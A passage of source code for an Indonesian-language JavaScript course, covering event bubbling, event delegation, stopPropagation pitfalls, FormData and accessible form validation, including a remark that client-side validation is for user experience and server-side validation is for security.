        Klik pada <button> di dalam <li> di dalam <ul>:

        1. CAPTURING  document -> ul -> li -> button   (turun)
        2. TARGET     button                            (sampai)
        3. BUBBLING   button -> li -> ul -> document    (naik)

        Secara default, listener berjalan pada fase BUBBLING.
        `,
      ),
      code(
        'js',
        `
        ul.addEventListener('click', () => console.log('ul (bubbling)'));
        ul.addEventListener('click', () => console.log('ul (capturing)'), { capture: true });
        btn.addEventListener('click', () => console.log('button'));

        // Output saat tombol diklik:
        // ul (capturing)
        // button
        // ul (bubbling)
        `,
      ),
      p(
        'Tiga baris keluaran itu membuktikan diagram di atas. Dua listener pertama terpasang pada elemen **yang sama** (`ul`) untuk peristiwa **yang sama** (`click`), tapi berjalan pada waktu yang berbeda, dan yang membedakannya hanya opsi `{ capture: true }`. Yang capturing berjalan lebih dulu karena event **turun** dari `document` ke sasaran sebelum naik kembali, sedangkan yang bubbling berjalan terakhir karena ia menunggu event naik. Listener pada tombolnya sendiri berjalan di tengah, saat event tepat berada di sasaran. Untuk kode sehari-hari kamu hampir selalu memakai fase bubbling, karena itu bawaannya dan itulah yang membuat event delegation di bawah mungkin. Fase capturing berguna justru untuk kasus khusus, misalnya menangkap peristiwa **sebelum** listener lain sempat menghentikannya, atau menangani peristiwa yang tidak menggelembung sama sekali seperti `scroll` pada elemen.',
      ),

      h2('Event delegation'),
      code(
        'js',
        `
        // SALAH: satu listener per baris. 100 baris = 100 listener,
        // dan baris yang ditambahkan nanti tidak punya listener sama sekali.
        document.querySelectorAll('.hapus').forEach((btn) => {
          btn.addEventListener('click', hapusBaris);
        });
        `,
      ),
      p(
        'Kode ini **bekerja**, dan itulah yang membuat masalahnya sulit terlihat. Dua kelemahannya baru muncul belakangan. Pertama, `querySelectorAll` menghasilkan potret pada saat dipanggil, sehingga baris yang ditambahkan setelah baris ini dijalankan tidak pernah ikut dipasangi listener. Tombol hapusnya terlihat sama persis tapi diam saat diklik, dan penyebabnya tidak akan terlihat di kode tombol itu. Kedua, jumlah listenernya tumbuh sebanding jumlah baris, dan tiap kali daftar di-render ulang kamu harus ingat melepas listener lama. Kalau tidak, mereka menumpuk bersama elemen yang sudah tidak tampil.',
      ),
      code(
        'js',
        `
        // BENAR: satu listener di wadah, selamanya
        daftar.addEventListener('click', (e) => {
          const tombol = e.target.closest('[data-aksi]');
          if (!tombol || !daftar.contains(tombol)) return;   // klik di luar sasaran

          const id = tombol.closest('[data-id]')?.dataset.id;

          switch (tombol.dataset.aksi) {
            case 'hapus':  hapus(id); break;
            case 'ubah':   ubah(id); break;
            case 'toggle': toggle(id); break;
          }
        });
        `,
      ),
      p(
        "Satu listener di wadah menggantikan seratus listener di baris, dan ia bekerja justru karena bubbling, sebab klik pada tombol mana pun **naik** sampai ke `daftar`, jadi wadahnya cukup menunggu di satu tempat. Telusuri isinya. `e.target.closest('[data-aksi]')` naik dari titik yang benar-benar diklik sampai menemukan elemen yang menyandang atribut aksi, dan itu perlu karena yang tersentuh bisa saja `<span>` atau ikon di dalam tombol. Baris penjaga berikutnya menangani dua kemungkinan sekaligus, sebab `!tombol` berarti klik mengenai area kosong, dan `!daftar.contains(tombol)` menutup kasus langka ketika `closest` menemukan sesuatu di luar wadah ini. Lalu `closest('[data-id]')` naik sekali lagi untuk mencari **baris** pemilik tombol itu, dan `?.` melindunginya bila baris tanpa id. Terakhir `switch` memetakan nilai atribut ke fungsinya, sehingga menambahkan aksi baru cukup dengan menambah satu `case` dan satu atribut di HTML.",
      ),
      p(
        'Baris yang ditambahkan lima menit kemudian otomatis ikut tertangani. Tidak ada listener yang perlu dipasang atau dilepas.',
      ),

      callout(
        'tip',
        'Kenapa `closest` wajib di sini',
        '`e.target` bisa berupa `<span>` atau ikon di dalam tombol. `closest("[data-aksi]")` naik dari titik klik sampai menemukan elemen yang punya atribut itu — yang persis kamu maksud, apa pun isi dalamnya.',
      ),

      h2('Event yang tidak menggelembung'),
      table(
        ['Event', 'Menggelembung?', 'Solusinya'],
        [
          ['`click`, `input`, `change`, `submit`', 'Ya', '—'],
          ['`focus` / `blur`', '**Tidak**', 'Pakai `focusin` / `focusout`'],
          ['`mouseenter` / `mouseleave`', '**Tidak**', 'Pakai `mouseover` / `mouseout`'],
          ['`scroll` (pada elemen)', '**Tidak**', 'Pakai `capture: true`'],
          ['`load`, `error`', '**Tidak**', 'Pasang langsung pada elemennya'],
        ],
      ),

      h2('Jebakan `stopPropagation`'),
      code(
        'js',
        `
        // Dropdown menutup saat klik di mana pun
        document.addEventListener('click', tutupSemuaDropdown);

        // Lalu seseorang menambahkan ini di dalam kartu:
        kartu.addEventListener('click', (e) => e.stopPropagation());

        // Sekarang dropdown TIDAK PERNAH tertutup kalau kliknya di dalam kartu.
        // Bugnya muncul di tempat yang sama sekali berbeda dari penyebabnya.
        `,
      ),
      p(
        'Perhatikan bahwa kedua baris itu **masing-masing masuk akal** kalau dibaca sendiri-sendiri. Listener di `document` adalah cara baku menutup dropdown saat pengguna mengeklik di luarnya. `stopPropagation` di kartu mungkin ditambahkan seseorang untuk alasan yang sah — misalnya supaya klik di dalam kartu tidak memicu listener lain. Bencananya lahir dari **kombinasinya**, dan justru itu yang membuat bug ini mahal: gejalanya muncul pada dropdown, sedangkan penyebabnya ada di berkas kartu yang mungkin ditulis orang lain berbulan-bulan sebelumnya. Tidak ada error, tidak ada peringatan, dan pencarian kata "dropdown" tidak akan pernah sampai ke baris penyebabnya. Itulah sebabnya `stopPropagation` layak diperlakukan sebagai keputusan yang perlu alasan tertulis, bukan sebagai perbaikan cepat.',
      ),
      callout(
        'warning',
        'Hampir selalu ada cara lain selain `stopPropagation`',
        'Alih-alih menghentikan event, periksa di listener global: `if (dropdown.contains(e.target)) return;`. Efeknya lokal dan tidak memutus perilaku komponen lain.',
      ),

      h2('Contoh utuh'),
      playground(
        'vanilla',
        {
          '/index.html': `<!doctype html>
<html lang="id">
  <head><meta charset="utf-8" /><title>Event Delegation</title></head>
  <body>
    <h1>Daftar tugas</h1>
    <button id="tambah" type="button">Tambah baris</button>
    <ul id="daftar"></ul>
    <script type="module" src="./index.js"></script>
  </body>
</html>
`,
          '/index.js': `const daftar = document.querySelector('#daftar');
let nomor = 0;

document.querySelector('#tambah').addEventListener('click', () => {
  nomor++;
  const li = document.createElement('li');
  li.dataset.id = String(nomor);

  const label = document.createElement('span');
  label.textContent = 'Tugas ' + nomor;

  const hapus = document.createElement('button');
  hapus.type = 'button';
  hapus.dataset.aksi = 'hapus';
  hapus.textContent = 'Hapus';

  li.append(label, ' ', hapus);
  daftar.append(li);
});

// SATU listener — menangani baris yang sudah ada maupun yang belum dibuat
daftar.addEventListener('click', (e) => {
  const tombol = e.target.closest('[data-aksi]');
  if (!tombol) return;

  const baris = tombol.closest('[data-id]');
  console.log('Menghapus baris', baris.dataset.id);
  baris.remove();
});

// Cobalah: tambah lima baris, lalu hapus. Perhatikan tidak ada listener
// yang pernah dipasang ke tombol hapus mana pun.
`,
        },
        'Event delegation — coba sendiri',
      ),

      divider,
      h2('Studi kasus di project nyata'),
      p(
        'Kembali ke tabel pesanan dari Sub-bab 4.2. Tombol Batalkan pada dua puluh baris pertama bekerja, dan tombol pada baris yang ditambahkan tombol Muat Lagi tidak melakukan apa-apa. Kamu sudah memperbaiki bagian daftar statisnya, dan bugnya tetap ada. Penyebab keduanya inilah yang diselesaikan delegasi, yaitu penangan hanya dipasang pada elemen yang **sudah ada** saat kode itu berjalan.',
      ),
      code(
        'js',
        `
        // Cara lama: satu penangan per tombol, dipasang sekali.
        for (const tombol of wadah.querySelectorAll('[data-aksi="batalkan"]')) {
          tombol.addEventListener('click', batalkan);
        }

        // Baris baru dari 'Muat Lagi' tidak pernah lewat loop ini,
        // jadi tombolnya tidak punya penangan sama sekali.
        `,
        { filename: 'Sebelum' },
      ),
      code(
        'js',
        `
        // Delegasi: SATU penangan di wadah yang tidak pernah diganti.
        const wadah = document.getElementById('daftar-pesanan');

        wadah.addEventListener('click', async (peristiwa) => {
          // Cari elemen bertanda terdekat, mulai dari yang benar-benar diklik.
          const tombol = peristiwa.target.closest('[data-aksi]');
          if (!tombol || !wadah.contains(tombol)) return;

          const baris = tombol.closest('[data-pesanan-id]');
          const id = baris?.dataset.pesananId;
          if (!id) return;

          switch (tombol.dataset.aksi) {
            case 'batalkan':
              await batalkan(id, baris);
              break;
            case 'cetak':
              cetak(id);
              break;
            default:
              break;
          }
        });
        `,
        { filename: 'src/admin/tabel-pesanan.js' },
      ),
      p(
        'Satu penangan menggantikan dua puluh, dan yang lebih penting ia tetap bekerja untuk baris yang belum ada saat kode ini berjalan. Alasannya mekanis, yaitu klik pada tombol merambat naik melewati barisnya, melewati wadahnya, sampai ke `document`. Penangan di wadah menerima klik itu tanpa peduli kapan tombolnya dibuat.',
      ),
      p(
        "Baris `peristiwa.target.closest('[data-aksi]')` menyelesaikan masalah yang muncul begitu tombolnya punya isi. Kalau tombol berisi ikon SVG dan teks, `peristiwa.target` bisa berupa SVG itu bukan tombolnya. `closest` menelusuri ke atas dari yang benar-benar diklik sampai menemukan yang bertanda, sehingga klik di ikon maupun di teks sama-sama tertangani.",
      ),
      p(
        'Pemeriksaan `wadah.contains(tombol)` terlihat berlebihan dan ia menutup satu kasus nyata. Kalau wadahnya berisi elemen yang dipindahkan ke tempat lain, misalnya dialog yang dipasang di `body`, `closest` bisa menemukan elemen bertanda yang sebenarnya sudah berada di luar wadah ini. Pemeriksaan itu memastikan penangan hanya menanggapi apa yang memang di bawah tanggung jawabnya.',
      ),
      code(
        'js',
        `
        // Perbedaan target dan currentTarget, yang menentukan cara membaca peristiwa.
        wadah.addEventListener('click', (e) => {
          e.target;         // elemen yang BENAR-BENAR diklik, bisa ikon di dalam tombol
          e.currentTarget;  // elemen tempat penangan ini dipasang, selalu 'wadah'
          e.eventPhase;     // 3 saat naik (bubbling), 1 saat turun (capturing)
        });

        // Fase turun dipakai untuk menangkap SEBELUM penangan di dalamnya.
        document.addEventListener('click', catatSemuaKlik, { capture: true });
        `,
        { caption: '`currentTarget` hanya benar selama penangan berjalan sinkron.' },
      ),
      p(
        'Perbedaan keduanya sering menjadi sumber bug halus. `e.currentTarget` menjadi `null` setelah penangan selesai, sehingga membacanya sesudah `await` menghasilkan `null`. Kalau kamu membutuhkannya di bagian asinkron, simpan dulu ke variabel di baris pertama penangan. `e.target` tidak punya masalah itu dan tetap menunjuk elemen yang sama.',
      ),
      callout(
        'info',
        'Tidak semua peristiwa merambat naik',
        'Peristiwa `focus`, `blur`, `mouseenter`, dan `mouseleave` tidak merambat, sehingga delegasi tidak bekerja untuk keempatnya. Padanan yang merambat tersedia, yaitu `focusin` dan `focusout` untuk fokus, serta `mouseover` dan `mouseout` untuk tetikus. Kalau delegasimu tidak pernah terpanggil, periksa dulu apakah peristiwanya memang merambat.',
      ),

      h2('Saat error-nya muncul'),
      p(
        'Delegasi jarang melempar error. Yang muncul adalah penangan yang menanggapi terlalu banyak atau terlalu sedikit.',
      ),
      code(
        'text',
        `
        wadah.addEventListener('click', (e) => {
          hapus(e.target.dataset.id);
        });

        TypeError: Cannot read properties of undefined (reading 'id')
        `,
        { caption: '`e.target` adalah ikon di dalam tombol, bukan tombolnya.' },
      ),
      p(
        'Tombol yang berisi ikon SVG dan teks punya beberapa elemen di dalamnya, dan yang diklik bisa salah satunya. Elemen itu tidak punya atribut data yang kamu cari, sehingga `dataset.id` bernilai `undefined`. Ini penyebab bug yang khas, yaitu tombolnya bekerja kalau diklik di tepinya dan gagal kalau diklik tepat di ikonnya. Selalu mulai dengan `e.target.closest(...)`.',
      ),
      code(
        'text',
        `
        // Klik di mana pun di dalam wadah, termasuk di area kosong,
        // memanggil batalkan dengan id undefined.
        wadah.addEventListener('click', (e) => batalkan(e.target.dataset.pesananId));

        Error: Pesanan undefined tidak ditemukan
        `,
        { caption: 'Tidak ada penjaga, sehingga klik di luar tombol pun ikut diproses.' },
      ),
      p(
        'Penangan delegasi menerima **seluruh** klik di dalam wadahnya, termasuk klik di jarak antar-baris, di teks judul kolom, dan di area kosong. Tanpa penjaga berupa `if (!tombol) return`, setiap klik itu ikut memicu aksinya. Penjaga keluar lebih awal adalah bagian wajib dari pola delegasi, bukan penyempurnaan.',
      ),
      code(
        'text',
        `
        wadah.addEventListener('click', tangani);
        tombolDalam.addEventListener('click', (e) => e.stopPropagation());

        // Penangan delegasi tidak pernah terpanggil untuk tombol itu.
        `,
        { caption: '`stopPropagation` di elemen dalam memutus perambatan.' },
      ),
      p(
        'Ini penyebab yang sangat sulit ditelusuri, sebab kode yang bermasalah berada di berkas yang berbeda dari kode yang gejalanya terlihat. Sering kali `stopPropagation` itu ditambahkan orang lain untuk memperbaiki masalah lain, misalnya menu yang menutup terlalu cepat. Kalau delegasimu tidak terpanggil untuk sebagian elemen saja, cari `stopPropagation` di antara wadah dan elemen itu.',
      ),
      code(
        'text',
        `
        wadah.addEventListener('click', async (e) => {
          await simpan();
          console.log(e.currentTarget);
        });

        null
        `,
        { caption: '`currentTarget` menjadi `null` setelah penangan selesai berjalan.' },
      ),
      p(
        'Peramban mengosongkan `currentTarget` begitu penanganan peristiwa selesai, dan `await` membuat sisa fungsi berjalan setelah itu. Kalau kamu butuh nilainya di bagian asinkron, simpan di baris pertama dengan `const wadahIni = e.currentTarget`. Perilaku yang sama berlaku untuk beberapa properti peristiwa lain, jadi kebiasaan menyalin yang dibutuhkan di awal penangan layak dijadikan aturan.',
      ),
      table(
        ['Pesan atau gejala', 'Penyebab sebenarnya', 'Perbaikannya'],
        [
          [
            '`Cannot read properties of undefined` pada `e.target.dataset`',
            'Yang diklik elemen di dalam tombol',
            "Pakai `e.target.closest('[data-aksi]')`",
          ],
          [
            'Klik di area kosong ikut memicu aksi',
            'Tidak ada penjaga keluar lebih awal',
            'Tulis `if (!tombol) return` setelah `closest`',
          ],
          [
            'Delegasi tidak terpanggil untuk sebagian elemen',
            'Ada `stopPropagation` di antara wadah dan elemen itu',
            'Cari dan hapus, atau perbaiki syarat penangan yang memasangnya',
          ],
          [
            '`e.currentTarget` bernilai `null`',
            'Dibaca setelah `await`',
            'Salin ke variabel di baris pertama penangan',
          ],
          [
            'Delegasi tidak bekerja sama sekali untuk `focus` atau `mouseenter`',
            'Keempat peristiwa itu tidak merambat',
            'Pakai `focusin`, `focusout`, `mouseover`, atau `mouseout`',
          ],
        ],
      ),

      h2('Kesalahan umum pemula'),
      p(
        'Delegasi adalah pola yang sangat berguna dan sangat mudah dipakai terlalu luas. Beberapa baris di bawah adalah batas yang perlu dijaga.',
      ),
      table(
        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
        [
          [
            'Memasang seluruh delegasi di `document`',
            'Satu tempat untuk semuanya',
            'Setiap klik di halaman melewati seluruh penangan itu, dan pemeriksaannya bertumpuk. Pasang di wadah terdekat yang stabil',
          ],
          [
            'Memakai `e.target` langsung tanpa `closest`',
            'Untuk tombol tanpa isi memang bekerja',
            'Begitu tombolnya diberi ikon, targetnya berubah. Kebiasaan memakai `closest` menutup seluruh kelas bug ini',
          ],
          [
            'Memakai `stopPropagation` untuk mencegah delegasi ikut terpanggil',
            'Masalahnya langsung hilang',
            'Ia juga memutus penangan lain yang sah, termasuk yang menutup dropdown. Perbaiki syarat di delegasinya',
          ],
          [
            'Menyimpan data yang dibutuhkan aksi di variabel penutup, bukan di elemennya',
            'Lebih mudah dijangkau',
            'Delegasi tidak tahu baris mana yang diklik, jadi datanya harus bisa dibaca dari elemennya. Simpan idnya di atribut data',
          ],
          [
            'Memakai delegasi untuk elemen yang jumlahnya tetap dan sedikit',
            'Polanya kan lebih baik',
            'Untuk satu tombol yang tidak pernah diganti, penangan langsung lebih pendek dan lebih jelas. Delegasi berguna untuk daftar yang berubah',
          ],
          [
            'Menaruh seluruh cabang aksi dalam satu penangan raksasa',
            'Semua di satu tempat',
            'Blok `switch` berisi dua puluh cabang menjadi sulit dibaca dan sulit diuji. Petakan aksi ke fungsi lewat object, seperti pola di Bab 2',
          ],
        ],
      ),
      p(
        'Baris pertama punya biaya yang bisa diukur pada halaman ramai. Penangan di `document` menerima setiap klik di seluruh halaman, dan kalau ada sepuluh delegasi terpasang di sana, setiap klik menjalankan sepuluh pemeriksaan `closest`. Memasangnya di wadah terdekat yang tidak pernah diganti memberi seluruh keuntungan delegasi tanpa biaya itu, dan sekaligus membatasi jangkauan agar tidak menanggapi klik dari bagian halaman yang tidak berhubungan.',
      ),
      callout(
        'tip',
        'Ganti `switch` panjang dengan tabel aksi',
        'Bentuk `const aksi = { batalkan: (id) => ..., cetak: (id) => ... }` lalu `aksi[tombol.dataset.aksi]?.(id)` menggantikan seluruh blok `switch`. Menambah aksi baru berarti menambah satu baris di object, dan tiap aksi bisa diuji sendiri tanpa peristiwa apa pun. Ini penerapan langsung pola dari Sub-bab 2.1.',
      ),
      divider,
      h2('Rangkuman'),
      ul(
        'Event turun (capturing), sampai (target), lalu naik (bubbling). Default: bubbling.',
        'Satu listener di wadah menangani semua anak, termasuk yang ditambahkan kemudian.',
        '`e.target.closest(selector)` mendapatkan elemen yang kamu maksud, bukan yang persis diklik.',
        '`focus`, `blur`, `mouseenter`, `mouseleave` tidak menggelembung — ada penggantinya.',
        '`stopPropagation` memutus listener global orang lain; hampir selalu ada cara lain.',
      ),
      references(
        {
          label: 'Event bubbling and capture',
          href: 'https://developer.mozilla.org/en-US/docs/Learn_web_development/Core/Scripting/Event_bubbling',
          source: 'MDN',
          note: 'Penjelasan ketiga fase beserta contoh event delegation dari sumber resminya.',
        },
        {
          label: 'Element.closest()',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Element/closest',
          source: 'MDN',
          note: 'Menegaskan bahwa pencariannya dimulai dari elemen itu sendiri, baru naik ke induknya.',
        },
        {
          label: 'Event.stopPropagation()',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Event/stopPropagation',
          source: 'MDN',
          note: 'Termasuk bedanya dengan `stopImmediatePropagation` yang lebih agresif.',
        },
        {
          label: 'Element: focusin event',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Element/focusin_event',
          source: 'MDN',
          note: 'Pengganti `focus` yang menggelembung — dibutuhkan agar delegation tetap bisa dipakai.',
        },
        {
          label: 'Event dispatch and DOM event flow',
          href: 'https://dom.spec.whatwg.org/#dispatching-events',
          source: 'WHATWG DOM',
          note: 'Spesifikasi resmi urutan capturing, target, dan bubbling.',
        },
      ),
    ],
  ),

  written(
    'form-input',
    'Form & Input: `FormData`, validasi',
    25,
    'Mengambil dan memvalidasi masukan pengguna — dan kenapa validasi klien bukan pengaman.',
    [
      terms(
        {
          term: 'form',
          meaning:
            'Elemen `<form>` yang mengumpulkan masukan pengguna. Yang wajib diingat: peristiwa `submit` terjadi pada **form**, bukan pada tombolnya. Menekan Enter di dalam sebuah input juga mengirim form, dan pendengar yang hanya dipasang di tombol akan melewatkannya sepenuhnya.',
        },
        {
          term: 'input vs change',
          meaning:
            'Dua peristiwa yang mirip tapi berbeda waktunya. `input` terpicu **setiap ketikan**, sehingga cocok untuk pratinjau langsung dan pencarian. `change` terpicu **setelah selesai dan kehilangan fokus** atau saat sebuah pilihan dibuat, sehingga cocok untuk hal yang mahal, agar tidak dijalankan pada tiap huruf.',
        },
        {
          term: 'submit',
          meaning:
            'Peristiwa pengiriman form. Perilaku bawaannya adalah **memuat ulang halaman**, dan itulah yang dibatalkan `e.preventDefault()`. Kalau kamu pernah melihat halaman berkedip lalu semua data hilang, penyebabnya hampir selalu `preventDefault` yang lupa ditulis.',
        },
        {
          term: 'FormData',
          meaning:
            'Objek yang **mengumpulkan seluruh isi form sekaligus** tanpa perlu menyeleksi tiap input satu per satu. Kuncinya ada di atribut `name` tiap input — tanpa `name`, sebuah input **tidak ikut terbaca** sama sekali. Ini kesalahan yang sangat sering terjadi dan tidak memunculkan error apa pun.',
        },
        {
          term: 'name',
          meaning:
            'Atribut yang menjadi **kunci** sebuah input di dalam `FormData` maupun saat dikirim ke server. Berbeda dari `id` yang dipakai untuk menghubungkan `<label>` dan untuk seleksi dari JavaScript. Sebuah input bisa punya keduanya, dan biasanya memang perlu.',
        },
        {
          term: 'validasi klien',
          meaning:
            'Pemeriksaan masukan yang berjalan **di browser**. Kegunaannya nyata: pengguna dapat jawaban seketika tanpa menunggu jaringan. Tapi ia **bukan pengaman** — siapa pun bisa mematikannya lewat DevTools atau mengirim permintaan langsung tanpa membuka halamanmu sama sekali.',
        },
        {
          term: 'validasi server',
          meaning:
            'Pemeriksaan yang berjalan **di server**, dan **inilah satu-satunya yang benar-benar mengamankan**. Aturannya tegas dan tidak bisa ditawar: validasi klien untuk kenyamanan, validasi server untuk keamanan. Keduanya dibutuhkan, dan yang satu tidak pernah menggantikan yang lain.',
        },
        {
          term: 'Constraint Validation API',
          meaning:
            'Kemampuan bawaan HTML untuk memvalidasi tanpa menulis kode: atribut `required`, `type="email"`, `minlength`, `pattern`. Dilengkapi method seperti `checkValidity()` dan `setCustomValidity()` dari JavaScript. Keuntungan besarnya: pesan errornya otomatis mengikuti bahasa perangkat pengguna.',
        },
        {
          term: 'autocomplete',
          meaning:
            'Atribut yang memberi tahu browser **jenis data apa** yang diminta sebuah input — `name`, `email`, `current-password`. Bukan sekadar kenyamanan: pengisian otomatis yang bekerja benar mengurangi salah ketik, dan sangat membantu pengguna dengan keterbatasan motorik.',
        },
        {
          term: 'label',
          meaning:
            'Elemen `<label>` yang dihubungkan ke input lewat `for` yang cocok dengan `id`-nya. Wajib ada: tanpa itu, pembaca layar tidak bisa menyebutkan input itu untuk apa, dan area yang bisa diklik untuk memfokuskan input jadi jauh lebih kecil.',
        },
      ),

      h2('Tiga event yang berbeda'),
      table(
        ['Event', 'Kapan terpicu'],
        [
          ['`input`', 'Setiap ketikan — untuk pratinjau langsung'],
          ['`change`', 'Setelah selesai dan kehilangan fokus (atau memilih)'],
          ['`submit`', 'Pada `<form>`, bukan pada tombolnya'],
        ],
      ),
      callout(
        'danger',
        'Pasang listener pada `<form>`, bukan pada tombol',
        'Menekan Enter di dalam input juga mengirim form. Listener yang hanya ada di tombol akan melewatkannya sepenuhnya — dan halaman akan memuat ulang tanpa penjelasan.',
      ),

      h2('`FormData`'),
      code(
        'html',
        `
        <form id="daftar">
          <label for="nama">Nama</label>
          <input id="nama" name="nama" required autocomplete="name" />

          <label for="email">Email</label>
          <input id="email" name="email" type="email" required autocomplete="email" />

          <label>
            <input type="checkbox" name="setuju" /> Saya setuju
          </label>

          <button type="submit">Daftar</button>
        </form>
        `,
      ),
      code(
        'js',
        `
        const form = document.querySelector('#daftar');

        form.addEventListener('submit', (e) => {
          e.preventDefault();

          const fd = new FormData(form);

          fd.get('nama');                    // 'Zum'
          fd.get('setuju');                  // 'on' atau null
          Object.fromEntries(fd);            // { nama: 'Zum', email: '...' }

          // Untuk field yang boleh berulang (checkbox dengan nama sama)
          fd.getAll('minat');                // ['a', 'b']
        });
        `,
      ),
      p(
        "Perhatikan `new FormData(form)` membaca **seluruh** isi form dalam satu baris. Kamu tidak perlu menyeleksi tiap input satu per satu, dan menambah field baru di HTML otomatis ikut terbaca tanpa menyentuh JavaScript. Kuncinya ada pada atribut `name`, bukan `id`. Perhatikan di HTML di atas, `id` dipakai untuk menghubungkan `<label for=...>` sedangkan `name` yang menentukan kunci datanya. Tiga baris pembacaan punya sifat berbeda. `fd.get('setuju')` menghasilkan `'on'` atau `null`, karena checkbox yang tidak dicentang **tidak dikirim sama sekali**, jadi jangan harap menerima `false`. `Object.fromEntries(fd)` mengubahnya jadi object biasa yang enak dikirim sebagai JSON, tapi ia hanya menyimpan **nilai terakhir** untuk nama yang berulang, dan untuk itulah `getAll` ada.",
      ),
      callout(
        'warning',
        '`FormData` hanya membaca input yang punya atribut `name`',
        'Bukan `id`. Input tanpa `name` diabaikan diam-diam — dan ini penyebab "kenapa fieldnya kosong" yang paling sering.',
      ),

      h2('Validasi bawaan HTML'),
      code(
        'html',
        `
        <input
          name="email"
          type="email"
          required
          minlength="5"
          maxlength="100"
          autocomplete="email"
        />
        <input name="umur" type="number" min="17" max="120" />
        <input name="kode" pattern="[A-Z]{3}-\\d{4}" />
        `,
      ),
      code(
        'js',
        `
        input.checkValidity();      // true/false
        input.validity.tooShort;    // detail kenapa gagal
        input.validity.typeMismatch;
        input.validationMessage;    // pesan bawaan browser, sudah diterjemahkan

        // Pesan kustom
        input.setCustomValidity(sudahDipakai ? 'Email ini sudah terdaftar' : '');
        `,
      ),
      p(
        'Blok HTML di atas melakukan validasi **tanpa satu baris JavaScript pun**, karena browser sendiri yang menolak pengiriman dan menampilkan pesannya dalam bahasa perangkat pengguna. Itu keunggulan yang sering diabaikan orang yang langsung menulis validasi sendiri. Perhatikan juga `autocomplete="email"`, yang bukan validasi tetapi justru yang membuat pengelola password dan isian otomatis bekerja benar. Blok JavaScript di bawahnya untuk kasus yang tidak bisa dijawab HTML. `checkValidity()` menjawab lulus atau tidak, sedangkan objek `validity` menjelaskan **kenapa**. `tooShort` berbeda dari `typeMismatch`, dan membedakannya memungkinkan pesan yang tepat sasaran. Baris terakhir menangani aturan yang hanya diketahui server. `setCustomValidity` dengan teks membuat field dianggap tidak valid, dan mengosongkannya kembali dengan `\'\'` **wajib** dilakukan saat masalahnya sudah teratasi. Kalau lupa, fieldnya akan dianggap salah selamanya.',
      ),

      h2('Menampilkan error dengan benar'),
      code(
        'js',
        `
        function tampilkanError(input, pesan) {
          const kotak = document.querySelector(\`#error-\${input.name}\`);

          kotak.textContent = pesan;                       // teks, bukan HTML
          input.setAttribute('aria-invalid', String(Boolean(pesan)));
          input.setAttribute('aria-describedby', kotak.id);
        }

        form.addEventListener('submit', (e) => {
          e.preventDefault();

          if (!form.checkValidity()) {
            const pertamaGagal = form.querySelector(':invalid');
            pertamaGagal?.focus();          // arahkan pengguna ke masalahnya
            return;
          }

          kirim(new FormData(form));
        });
        `,
      ),
      p(
        "Fungsi `tampilkanError` mengerjakan tiga hal yang harus berjalan bersamaan. `kotak.textContent` menampilkan pesannya sebagai teks, dan itu perlu karena pesan error sering memuat kembali apa yang diketik pengguna, sehingga jalur `innerHTML` di sini akan menjadi celah XSS. `aria-invalid` memberi tahu pembaca layar bahwa field ini bermasalah, sedangkan `aria-describedby` **menghubungkan** field dengan kotak pesannya, sehingga pembaca layar membacakan errornya saat fokus masuk ke field itu. Tanpa penghubung ini, pesan yang tampil di layar tidak pernah sampai ke pengguna yang tidak melihatnya. Bagian `submit` menambahkan hal yang sama pentingnya. `form.querySelector(':invalid')` mencari field pertama yang gagal, dengan `:invalid` sebagai pseudo-class CSS yang bisa dipakai sebagai selector biasa, lalu `focus()` memindahkan kursor ke sana. Tanpa langkah itu, pengguna pada form panjang hanya melihat pengiriman gagal tanpa tahu bagian mana yang harus diperbaiki.",
      ),
      callout(
        'tip',
        'Tiga hal yang sering terlewat pada form',
        'Pesan error harus **berada di dekat fieldnya** dan terhubung lewat `aria-describedby`; fokus harus **berpindah ke field pertama yang gagal**; dan tombol submit harus **dinonaktifkan selama pengiriman** supaya tidak terkirim dua kali.',
      ),

      h2('Validasi klien bukan pengaman'),
      code(
        'js',
        `
        // Semua ini bisa dilewati dalam sepuluh detik lewat DevTools:
        //   - menghapus atribut required
        //   - mengubah maxlength
        //   - memanggil endpoint langsung dengan curl, tanpa membuka halaman sama sekali
        //
        // Validasi di klien adalah soal PENGALAMAN: feedback cepat, tanpa
        // menunggu jaringan. Kontrol keamanannya SELALU di server.
        `,
      ),
      p(
        'Blok ini sengaja tidak berisi kode yang bisa dijalankan, karena intinya justru **apa yang bisa dilakukan orang lain terhadap kodemu**. Seluruh validasi yang baru saja kamu pasang, mulai dari `required`, `maxlength`, `pattern`, sampai `checkValidity`, hidup di halaman yang sepenuhnya berada di komputer pengguna, dan karena itu bisa diubah siapa pun lewat DevTools dalam hitungan detik. Poin terakhir yang paling menentukan. Penyerang tidak perlu repot mengakali halamanmu sama sekali, karena ia cukup memanggil endpoint-nya langsung dengan `curl` dan halamanmu tidak pernah terlibat. Kesimpulannya bukan bahwa validasi klien tidak berguna, sebab ia sangat berguna karena memberi feedback seketika tanpa menunggu jaringan. Yang benar adalah menempatkannya dengan jujur, yaitu validasi klien untuk **pengalaman**, validasi server untuk **keamanan**, dan keduanya memang harus ditulis dua kali.',
      ),

      divider,
      h2('Studi kasus di project nyata'),
      p(
        'Formulir alamat pengiriman punya delapan kolom, yaitu nama penerima, telepon, provinsi, kota, kode pos, alamat lengkap, catatan kurir, dan centang jadikan alamat utama. Kamu membacanya satu per satu dengan `getElementById` lalu `.value`, dan berkasnya menjadi dua puluh baris pembacaan sebelum satu baris logika pun ditulis. Lalu muncul dua bug, yaitu centang yang tidak dicentang terkirim sebagai teks kosong, dan kode pos yang hilang nol di depannya.',
      ),
      p(
        'Keduanya selesai dengan memakai `FormData`, yaitu API bawaan yang membaca seluruh formulir sekaligus dengan aturan yang sama dengan yang dipakai peramban saat mengirim formulir biasa.',
      ),
      code(
        'js',
        `
        const form = document.getElementById('form-alamat');

        form.addEventListener('submit', (peristiwa) => {
          peristiwa.preventDefault();

          // Satu baris menggantikan dua puluh pembacaan.
          const data = Object.fromEntries(new FormData(form));

          console.log(data);
          // { nama: 'Sari', setuju: 'on', kota: 'bdg' }   <- diverifikasi di Chromium
        });
        `,
        { filename: 'src/alamat.js' },
      ),
      p(
